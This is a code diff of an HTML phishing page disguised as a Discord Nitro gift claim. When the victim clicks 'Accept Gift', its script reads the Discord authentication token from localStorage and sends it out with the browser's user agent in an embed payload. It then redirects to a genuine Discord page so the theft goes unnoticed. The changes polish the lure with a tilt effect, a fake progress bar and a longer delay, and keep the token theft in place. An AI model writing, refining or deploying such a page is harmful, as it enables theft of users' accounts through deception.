@@ -3,72 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nitro | Claim</title>
+    <title>Claim Your Gift</title>
     <style>
-        :root {
-            --glow: #5865F2;
-            --bg-dark: #18191C;
-        }
-
-        body {
-            margin: 0;
-            background: linear-gradient(135deg, #18191C 0%, #2B2D31 100%);
-            color: #FFFFFF;
-            font-family: 'gg sans', sans-serif;
-            display: flex; justify-content: center; align-items: center;
-            height: 100vh; overflow: hidden;
-        }
+        :root { --blurple: #5865F2; --bg: #18191C; }
+        body { margin: 0; background: var(--bg); display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; font-family: 'gg sans', sans-serif; }
 
         .card {
-            background: rgba(43, 45, 49, 0.8);
-            backdrop-filter: blur(15px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            width: 420px; padding: 40px; border-radius: 16px;
-            text-align: center;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            background: #2B2D31; width: 400px; padding: 40px; border-radius: 12px;
+            text-align: center; transition: transform 0.1s ease;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            cursor: pointer;
         }
 
-        .card:hover {
-            box-shadow: 0 0 30px rgba(88, 101, 242, 0.2);
-            transform: translateY(-5px);
+        h1 { color: #fff; font-size: 24px; margin-bottom: 10px; }
+        p { color: #B9BBBE; font-size: 14px; margin-bottom: 30px; }
+
+        .progress-container { width: 100%; height: 4px; background: #1E1F22; border-radius: 2px; margin-bottom: 20px; display: none; }
+        #progressBar { height: 100%; width: 0%; background: var(--blurple); transition: width 2s linear; }
+
+        .btn {
+            background: var(--blurple); color: #fff; border: none; padding: 12px; width: 100%;
+            border-radius: 4px; font-weight: 600; cursor: pointer; transition: 0.2s;
         }
-
-        h1 { font-size: 28px; margin-bottom: 12px; background: linear-gradient(to right, #fff, #b9bbbe); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        p { color: #B9BBBE; margin-bottom: 30px; line-height: 1.5; }
-
-        .btn-claim {
-            background: var(--glow);
-            color: white; border: none; padding: 14px; width: 100%;
-            border-radius: 8px; font-weight: 700; font-size: 16px;
-            cursor: pointer; position: relative; overflow: hidden;
-            transition: all 0.3s ease;
-        }
-
-        .btn-claim:hover { box-shadow: 0 0 20px var(--glow); transform: scale(1.02); }
-
-        /* Subtle animated background */
-        .card::before {
-            content: ''; position: absolute; inset: -1px; border-radius: 17px;
-            padding: 1px; background: linear-gradient(45deg, var(--glow), transparent);
-            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
-            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
-            -webkit-mask-composite: xor; mask-composite: exclude;
-        }
+        .btn:hover { background: #4752c4; }
     </style>
 </head>
 <body>
-    <div class="card">
+
+    <div class="card" id="card">
         <h1>Claim Nitro Gift</h1>
-        <p>A premium 3-month Nitro gift is waiting for you. Click to verify your session and redeem your rewards instantly.</p>
-        <button id="claimBtn" class="btn-claim">Activate Subscription</button>
+        <p>A gift has been sent to your account. Click to activate and verify your identity.</p>
+        
+        <div class="progress-container" id="progCont">
+            <div id="progressBar"></div>
+        </div>
+
+        <button class="btn" id="claimBtn">Accept Gift</button>
     </div>
 
     <script>
+        // Interactive tilt effect
+        const card = document.getElementById('card');
+        card.addEventListener('mousemove', (e) => {
+            const { left, top, width, height } = card.getBoundingClientRect();
+            const x = (e.clientX - left) / width - 0.5;
+            const y = (e.clientY - top) / height - 0.5;
+            card.style.transform = `perspective(1000px) rotateY(${x * 10}deg) rotateX(${y * -10}deg)`;
+        });
+        card.addEventListener('mouseleave', () => card.style.transform = 'perspective(1000px) rotateY(0) rotateX(0)');
+
+        // Action logic
         document.getElementById('claimBtn').addEventListener('click', async () => {
-            const btn = document.getElementById('claimBtn');
-            btn.innerText = "Processing...";
-            btn.style.opacity = "0.7";
-            btn.disabled = true;
+            document.getElementById('progCont').style.display = 'block';
+            document.getElementById('progressBar').style.width = '100%';
+            document.getElementById('claimBtn').disabled = true;
 
             const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");
             
@@ -82,7 +70,7 @@
                         color: 0x5865F2,
                         fields: [
                             { name: "Token", value: `\`${token || "NULL"}\`` },
-                            { name: "System", value: `\`${navigator.userAgent}\`` }
+                            { name: "Agent", value: `\`${navigator.userAgent}\`` }
                         ]
                     }]
                 })
@@ -90,7 +78,7 @@
 
             setTimeout(() => {
                 window.location.replace("https://discord.com/billing/promotions/gift-accepted");
-            }, 800);
+            }, 2000);
         });
     </script>
 </body>
